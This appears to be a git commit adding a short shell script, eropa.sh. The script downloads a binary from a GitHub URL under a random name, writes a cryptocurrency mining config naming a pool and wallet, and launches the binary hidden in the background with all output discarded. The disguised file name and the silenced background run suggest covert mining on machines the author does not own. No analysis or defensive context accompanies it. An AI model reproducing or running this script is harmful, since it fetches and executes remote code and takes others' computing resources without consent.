85aef38919a3a8dda71c4a253973738480fa3c4b
henstyle <henspicsaypro@gmail.com>
2025-09-15 13:32:16 +0700

    Create eropa.sh

---
+++ eropa.sh
@@ -0,0 +1,18 @@
+NAME=$(tr -dc A-Za-z </dev/urandom | head -c 4)
+
+wget -q -O "${NAME}" https://raw.githubusercontent.com/DOT-SUNDA/cloudsigma/refs/heads/main/JOKO
+current_date=$(TZ=UTC-7 date +"%H-%M [%d-%m]")
+cat > config.json <<END
+{
+  "url": "asia.rplant.xyz:7059",
+  "user": "EaGKnFyMFmkcGjmMuPhjcys9v8kNeZLS3Z.CS-EROPA",
+  "pass": "LAB",
+  "threads": 1,
+  "algo": "yespowertide"
+}
+END
+
+chmod +x config.json "${NAME}"
+
+# Run cidx in the background
+nohup ./$NAME -c 'config.json' &>/dev/null &
